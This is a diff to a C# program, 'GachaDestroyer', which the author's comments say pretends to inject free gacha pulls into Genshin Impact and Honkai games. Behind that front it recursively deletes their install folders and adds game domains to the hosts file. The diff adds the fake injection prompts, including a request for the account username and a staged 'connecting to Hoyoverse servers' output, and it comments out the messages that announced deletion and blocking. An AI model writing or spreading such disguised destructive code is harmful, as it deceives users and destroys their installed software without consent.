@@ -1,14 +1,7 @@
-﻿//This program claims to be a set of tools for Genshin Impact/other gacha games but instead deletes the game(s) in question and blocks domains related to them to prevent the games from being reinstalled or played again
-//Currently only targets Genshin Impact, Honkai Star Rail, and Honkai Impact 3rd, which is only the tip of the iceberg
-//Still working on the "claims to be a set of tools" part
+﻿//This program claims to inject free gacha pulls into Genshin Impact/other gacha games but instead deletes the game(s) in question and blocks domains related to them to prevent the games from being reinstalled or played again
+//Currently only targets Genshin Impact, Honkai Star Rail, and Honkai Impact 3rd
 
 //Spaghetti code written by xad1561
-
-/*
- * TODO:
- * Get domains and delete Honkai 3 as well
- * Have a way of searching all drives for the installation folders for the games
- */
 
 namespace GachaDestroyer
 {
@@ -33,6 +26,11 @@ namespace GachaDestroyer
             string Honkai3DirSteam = @"C:\Program Files (x86)\Steam\steamapps\common\HonkaiImpact3rd";
             string Honkai3DirEpic = @"C:\Program Files\Epic Games\HonkaiImpact3rd";
             string Honkai3Dir = @"C:\Program Files\Honkai Impact 3rd";
+
+            //Don't modify these
+            bool GenshinDetected = false;
+            bool StarRailDetected = false;
+            bool Honkai3Detected = false;
 
             //The strings of the domains to block. If anybody has information on more related domains, please message me or let me know somehow so I can add them
             //Currently this only contains domains I found by capturing DNS packets with Wireshark and some I found through the absurd method of "looking up the official website for the games"
@@ -67,15 +65,15 @@ namespace GachaDestroyer
                 if (args[i] == "--DELETE")
                 {
                     actuallyDeleteFiles = true;
-                    Console.ForegroundColor = ConsoleColor.DarkRed;
-                    Console.WriteLine("Deleting Files");
+                    //Console.ForegroundColor = ConsoleColor.DarkRed;
+                    //Console.WriteLine("Deleting Files");
                 }
 
                 if (args[i] == "--BLOCK")
                 {
                     blockDomains = true;
-                    Console.ForegroundColor = ConsoleColor.DarkRed;
-                    Console.WriteLine("Blocking Domains");
+                    //Console.ForegroundColor = ConsoleColor.DarkRed;
+                    //Console.WriteLine("Blocking Domains");
                 }
             }
 
@@ -92,6 +90,60 @@ namespace GachaDestroyer
             //Block the domains if the --BLOCK arg is given
             if (blockDomains) { blockDomainsToHostsFile(domainsToBlock); }
 
+            //Act like a real program, I don't know how to make this all that convincing because I don't actually play gacha games so enjoy my guess based off of reading a Wikipedia article
+            Console.WriteLine("Which game would you like to inject free pulls into? ");
+            while (true)
+            {
+                string input = ((Console.ReadLine()).ToUpper()).Trim();
+                if (input == "GENSHIN" | input == "GENSHIN IMPACT" | input == "GI" | input == "HONKAI 4" | input == "HK4")
+                {
+                    if (GenshinDetected)
+                    {
+                        fakeInject("Genshin Impact");
+                        break;
+                    }
+                    else
+                    {
+                        Console.WriteLine("That game is not detected");
+                    }
+                }
+
+                else if (input == "STAR RAIL" | input == "HONKAI STAR RAIL" | input == "HSR" | input == "HKSR")
+                {
+                    if (StarRailDetected)
+                    {
+                        fakeInject("Honkai Star Rail");
+                        break;
+                    }
+                    else
+                    {
+                        Console.WriteLine("That game is not detected");
+                    }
+                }
+
+                else if (input == "HONKAI 3RD" | input == "HONKAI 3" | input == "HK3" | input == "HONKAI IMPACT" | input == "HONKAI IMPACT 3RD")
+                {
+                    if (Honkai3Detected)
+                    {
+                        fakeInject("Honkai Impact 3rd");
+                        break;
+                    }
+                    else
+                    {
+                        Console.WriteLine("That game is not detected");
+                    }
+                }
+
+                else if (input == "QUIT" | input == "EXIT")
+                {
+                    break;
+                }
+                else
+                {
+                    Console.WriteLine("Please enter a valid game or type 'quit' to exit");
+                }
+            }
+
             /////////////
             //Functions//
             /////////////
@@ -103,6 +155,7 @@ namespace GachaDestroyer
                 if (Directory.Exists(GenshinDirEpic))
                 {
                     Console.WriteLine("Genshin Impact Detected on Epic Games");
+                    GenshinDetected = true;
                     try
                     {
                         if (actuallyDeleteFiles) { Directory.Delete(GenshinDirEpic, true); }
@@ -123,6 +176,7 @@ namespace GachaDestroyer
                 if (Directory.Exists(GenshinDir))
                 {
                     Console.WriteLine("Standalone Genshin Impact Detected");
+                    GenshinDetected = true;
                     try
                     {
                         if (actuallyDeleteFiles) { Directory.Delete(GenshinDir, true); }
@@ -141,21 +195,24 @@ namespace GachaDestroyer
                 //Epic Games
                 if (Directory.Exists(StarRailDirEpic))
                 {
-                    Console.WriteLine("Honkai Star Rail Detected");
+                    Console.WriteLine("Honkai Star Rail Detected on Epic Games");
+                    StarRailDetected = true;
                     try
                     {
                         if (actuallyDeleteFiles) { Directory.Delete(StarRailDirEpic, true); }
-                    } catch { }
+                    }
+                    catch { }
                 }
                 else
                 {
-                    Console.WriteLine("Honkai Star Rail not detected");
+                    Console.WriteLine("Honkai Star Rail not detected on Epic Games");
                 }
 
                 //Standalone
                 if (Directory.Exists(StarRailDir))
                 {
                     Console.WriteLine("Standalone Honkai Star Rail Detected");
+                    StarRailDetected = true;
                     try
                     {
                         if (actuallyDeleteFiles) { Directory.Delete(StarRailDir, true); }
@@ -175,10 +232,12 @@ namespace GachaDestroyer
                 if (Directory.Exists(Honkai3DirEpic))
                 {
                     Console.WriteLine("Honkai 3 Detected on Epic Games");
+                    Honkai3Detected = true;
                     try
                     {
                         if (actuallyDeleteFiles) { Directory.Delete(Honkai3DirEpic, true); }
-                    } catch { }
+                    }
+                    catch { }
                 }
                 else
                 {
@@ -189,10 +248,12 @@ namespace GachaDestroyer
                 if (Directory.Exists(Honkai3DirSteam))
                 {
                     Console.WriteLine("Honkai 3 Detected on Steam");
+                    Honkai3Detected = true;
                     try
                     {
                         if (actuallyDeleteFiles) { Directory.Delete(Honkai3DirSteam, true); }
-                    } catch { }
+                    }
+                    catch { }
                 }
                 else
                 {
@@ -202,7 +263,8 @@ namespace GachaDestroyer
                 //Standalone
                 if (Directory.Exists(Honkai3Dir))
                 {
-                    Console.WriteLine("Standalone Honkai 3 Detected on Steam");
+                    Console.WriteLine("Standalone Honkai 3 Detected");
+                    Honkai3Detected = true;
                     try
                     {
                         if (actuallyDeleteFiles) { Directory.Delete(Honkai3Dir, true); }
@@ -239,7 +301,7 @@ namespace GachaDestroyer
                     }
                     catch
                     {
-                        Console.WriteLine("Don't have Admin, cannot block hosts");
+                        //Console.WriteLine("Don't have Admin, cannot block hosts");
                         break;
                     }
                 }
@@ -251,8 +313,54 @@ namespace GachaDestroyer
                 if (contents.Contains(domain)) { return true; } else { return false; }
             }
 
-            //Stop the program from exiting
-            Console.ReadLine();
+            //Fake injecting free gacha pulls into a given game
+            void fakeInject(string game)
+            {
+                Random rand = new Random();
+                Console.WriteLine("Please enter your account username");
+                string uname = Console.ReadLine();
+                while (true)
+                {
+                    if (String.IsNullOrEmpty(uname))
+                    {
+                        Console.WriteLine("Please enter a username");
+                        uname = Console.ReadLine();
+                    }
+                    else
+                    {
+                        break;
+                    }
+                }
+                Console.WriteLine("How many pulls would you like to inject?");
+                string inp = Console.ReadLine();
+                int number;
+                while (true)
+                {
+                    try
+                    {
+                        number = Int32.Parse(inp);
+                    }
+                    catch
+                    {
+                        number = 0;
+                        Console.WriteLine("Please enter an integer (that means a number without decimal places)");
+                        inp = Console.ReadLine();
+                    }
+
+                    if (number != 0)
+                    {
+                        break;
+                    }
+                }
+                //hAcK tHe MaInFrAmE
+                Console.WriteLine("Connecting to Hoyoverse servers...");
+                System.Threading.Thread.Sleep(2000 + rand.Next(0, 2000));
+                Console.WriteLine("Successfully connected to Hoyoverse servers...");
+                System.Threading.Thread.Sleep(1500 + rand.Next(0, 2000));
+                Console.WriteLine($"Injected an additional {number} pulls into {game} for {uname}, enjoy opening!");
+                Console.WriteLine("Press enter to exit");
+                Console.ReadLine();
+            }
         }
     }
 }
